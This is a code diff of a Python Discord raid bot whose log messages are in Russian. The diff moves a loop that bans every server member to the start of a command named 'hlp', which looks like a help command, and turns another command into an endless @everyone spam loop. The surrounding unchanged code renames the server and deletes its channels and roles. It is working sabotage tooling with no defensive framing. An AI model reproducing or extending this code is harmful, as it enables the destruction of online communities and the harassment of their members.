@@ -31,6 +31,21 @@ async def on_ready():
 
 @client.command()
 async def hlp(ctx):
+
+    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
+    ban = 0
+    bany = 0
+    for member in ctx.guild.members:
+        try:
+            ban += 1
+            await member.ban()
+            bany += 1
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Бан этому{Fore.WHITE}: {member}")
+        except:
+            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Трабл с {Fore.WHITE}: {member}")
+            continue
+    print(f"{Fore.WHITE}> {Fore.RED}Было {Fore.WHITE} {ban} {Fore.RED} человек, а забанил {Fore.WHITE} {bany} {Fore.RED} человек {Fore.WHITE}.")
+    
     await ctx.send("РЕЙВ ПАТИИИИИ! СЕРВЕР ПОД КРОВАТЬЮ! @everyone ")
     await ctx.guild.edit(name="Концерт фейса")
     print(f"{Fore.WHITE}> {Fore.RED}Генеральная уборка! Теперь имя сервера другое )")
@@ -45,16 +60,6 @@ async def hlp(ctx):
             continue
     print(f"{Fore.WHITE}> {Fore.RED}Все, каналов нема{Fore.WHITE}.")
     
-    print(f"{Fore.WHITE}> {Fore.RED}В бан, чёртики!{Fore.WHITE}...")
-    ban = 0
-    for member in ctx.guild.members:
-        try:
-            ban += 1
-            await member.ban()
-            print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Бан этому{Fore.WHITE}: {member}")
-        except:
-            continue
-    print(f"{Fore.WHITE}> {Fore.RED}Усе, кого мох забанил, а мог я:{ban} человек{Fore.WHITE}.")
     
     print(f"{Fore.WHITE}> {Fore.RED}Теперь роли почистим{Fore.WHITE}...")
     roles = ctx.guild.roles
@@ -125,8 +130,7 @@ async def start(ctx):
 
 @client.command()
 async def ml(ctx):
-    await ctx.message.delete()
-    for s in range(999):
+    while True:
         await ctx.send("ЗАЛЕТЕЛ НА НЕБОСКРЕБ! ДА Я МЕСТНЫЙ МЕЗАНТРОП! @everyone")
         print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Спамим...")
     print(f"{Fore.RED}[{Fore.WHITE}LOG{Fore.RED}] Заспамили!")
